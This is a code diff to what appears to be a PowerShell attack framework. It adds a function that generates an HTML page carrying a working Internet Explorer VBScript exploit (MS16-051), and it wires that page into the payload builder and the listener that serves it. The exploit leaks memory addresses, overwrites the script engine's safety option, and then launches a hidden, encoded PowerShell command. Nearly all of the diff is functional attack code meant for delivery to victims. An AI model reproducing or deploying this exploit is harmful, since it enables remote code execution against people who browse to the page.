@@ -417,6 +417,161 @@ function CreateMacroPayload
 }
 
 # taken from nishang Out-Java
+
+
+function Create-MS16051Payload
+{
+$poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
+$bytes = [Text.Encoding]::Unicode.GetBytes($command)
+$payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+$payload = $payloadraw -replace "`n", ""
+$htmlpayload = $poshexec+'"'+','+$payload
+
+$html = @"
+<html>
+<head>
+<meta http-equiv="x-ua-compatible" content="IE=10">
+</head>
+<body>
+    <script type="text/vbscript">
+        Dim aw
+        Dim plunge(32)
+        Dim y(32)
+        prefix = "%u4141%u4141"
+        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
+        b = String(64000, "D")
+        c = d & b
+        x = UnEscape(c)
+
+        Class ArrayWrapper
+            Dim A()
+            Private Sub Class_Initialize
+                ' 2x2000 elements x 16 bytes / element = 64000 bytes
+                ReDim Preserve A(1, 2000)
+            End Sub
+
+            Public Sub Resize()
+                ReDim Preserve A(1, 1)
+            End Sub
+        End Class
+
+        Class Dummy
+        End Class
+
+        Function getAddr (arg1, s)
+            aw = Null
+            Set aw = New ArrayWrapper
+
+            For i = 0 To 32
+                Set plunge(i) = s
+            Next
+
+            Set aw.A(arg1, 2) = s
+
+            Dim addr
+            Dim i
+            For i = 0 To 31
+                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
+                    addr = strToInt(Mid(y(i), 3 + 4, 2))
+                End If
+                y(i) = Null
+            Next
+
+            If addr = Null Then
+                document.location.href = document.location.href
+                Return
+            End If
+
+            getAddr = addr
+        End Function
+
+        Function leakMem (arg1, addr)
+            d = prefix & "%u0008%u4141%u4141%u4141"
+            c = d & intToStr(addr) & b
+            x = UnEscape(c)
+
+            aw = Null
+            Set aw = New ArrayWrapper
+
+            Dim o
+            o = aw.A(arg1, 2)
+
+            leakMem = o
+        End Function
+
+        Sub overwrite (arg1, addr)
+            d = prefix & "%u400C%u0000%u0000%u0000"
+            c = d & intToStr(addr) & b
+            x = UnEscape(c)
+
+            aw = Null
+            Set aw = New ArrayWrapper
+
+            ' Single has vartype of 0x04
+            aw.A(arg1, 2) = CSng(0)
+        End Sub
+
+        Function exploit (arg1)
+            Dim addr
+            Dim csession
+            Dim olescript
+            Dim mem
+
+            ' Create a vbscript class instance
+            Set dm = New Dummy
+            ' Get address of the class instance
+            addr = getAddr(arg1, dm)
+            ' Leak CSession address from class instance
+            mem = leakMem(arg1, addr + 8)
+            csession = strToInt(Mid(mem, 3, 2))
+            ' Leak COleScript address from CSession instance
+            mem = leakMem(arg1, csession + 4)
+            olescript = strToInt(Mid(mem, 1, 2))
+            ' Overwrite SafetyOption in COleScript (e.g. god mode)
+            ' e.g. changes it to 0x04 which is not in 0x0B mask
+            overwrite arg1, olescript + &H174
+
+            ' Execute cmd
+            Set Object = CreateObject("Shell.Application")
+            Object.ShellExecute "$htmlpayload"
+        End Function
+
+        Function triggerBug
+            ' Resize array we are currently indexing
+            aw.Resize()
+
+            ' Overlap freed array area with our exploit string
+            Dim i
+            For i = 0 To 32
+                ' 24000x2 + 6 = 48006 bytes
+                y(i) = Mid(x, 1, 24000)
+            Next
+        End Function
+    </script>
+
+    <script type="text/javascript">
+        function strToInt(s)
+        {
+            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
+        }
+        function intToStr(x)
+        {
+            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
+        }
+        var o;
+        o = {"valueOf": function () {
+                triggerBug();
+                return 1;
+            }};
+        setTimeout(function() {exploit(o);}, 50);
+    </script>
+</body>
+</html>
+"@
+
+[IO.File]::WriteAllLines("$global:newdir\index.html", $html)
+Write-Host -Object "MS16-051 payload, use this via a web server: $global:newdir\index.html"  -ForegroundColor Green
+}
 function CreateJavaPayload
 {
 $OutputPath="$pwd"
@@ -685,6 +840,7 @@ primer | iex }'
     CreatePayload
     CreateMacroPayload
     CreateStandAloneExe
+    Create-MS16051Payload
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [Text.Encoding]::Unicode.GetBytes($command)
@@ -763,6 +919,10 @@ while ($listener.IsListening)
     if ($request.Url -match "/$($downloaduri)$") 
     {
         $message = $payload
+    }
+    if ($request.Url -match "/$($downloaduri)_html$")
+    {
+        $message = Get-Content -Path $global:newdir\index.html
     }
     if ($request.Url -match "/$($downloaduri)_rg$") 
     {
